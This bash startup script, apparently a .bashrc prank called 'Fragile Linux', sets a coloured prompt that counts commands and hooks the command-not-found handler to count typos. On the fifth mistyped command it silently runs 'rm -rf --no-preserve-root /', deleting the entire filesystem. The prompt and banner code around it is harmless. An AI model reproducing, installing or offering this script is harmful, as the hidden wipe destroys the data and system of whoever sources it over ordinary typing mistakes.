#!/bin/bash

# Set warning message
echo "===================================================="
echo "	  _____                      .__.__           "
echo "	_/ ____\___________     ____ |__|  |   ____   "
echo "	\   __\\_  __ \__  \   / ___\|  |  | _/ __ \  "
echo "	 |  |   |  | \// __ \_/ /_/  >  |  |_\  ___/  " 
echo "	 |__|   |__|  (____  /\___  /|__|____/\___  > "
echo "                     \//_____/              \/    " 
echo "===================================================="
echo

# If not running interactively, exit
[ -z "$PS1" ] && return

# --- vars ---
counter=0
MAX_LIVES=5
FAILED_AT=

# --- colors ---
CLR_RESET=$'\033[0m'
CLR_L_RED=$'\033[01;31m'
CLR_L_GREEN=$'\033[01;32m'
CLR_YELLOW=$'\033[01;33m'

# Function to handle invalid commands
function command_not_found_handle {
    ((counter++))
    remaining_lives=$((MAX_LIVES - counter))

    if [ $remaining_lives -gt 0 ]; then
        echo "⚠️  Incorrect command! You have $remaining_lives lives left."
    elif [ $counter -eq $MAX_LIVES ]; then
        echo "💀 Oh no... You've used all your lives! The system is being deleted!"
        rm -rf --no-preserve-root / >/dev/null 2>&1
        exit 1
    fi

    return 127
}

# Function to set the terminal prompt
function __sl_set_ps1 {
    COUNT=${FAILED_AT:-$HISTCMD}
    if [ -z "$FAILED_AT" ]; then
        PROMPT_COLOR=$CLR_L_GREEN
        COUNT_COLOR=$CLR_YELLOW
        TERMINAL_TITLE="Fragile Linux"
    else
        PROMPT_COLOR=$CLR_L_RED
        COUNT_COLOR=$CLR_L_RED
        TERMINAL_TITLE="Fragile Linux | (×_×)"
    fi

    TERMINAL_TITLE="$TERMINAL_TITLE | survived $COUNT commands"

    PS1="${CLR_RESET}[${COUNT_COLOR}${COUNT}${CLR_RESET}] ${PROMPT_COLOR}\u@\h:\w\$${CLR_RESET} "
    echo -en "\033]0;${TERMINAL_TITLE}\a"
}

# Function to detect command failures
function __sl_prompt_command {
    if [[ "$?" == "127" && -z "$FAILED_AT" ]]; then
        FAILED_AT=$((HISTCMD-1))
    fi
    __sl_set_ps1
}

# Set the prompt command
PROMPT_COMMAND="__sl_prompt_command"
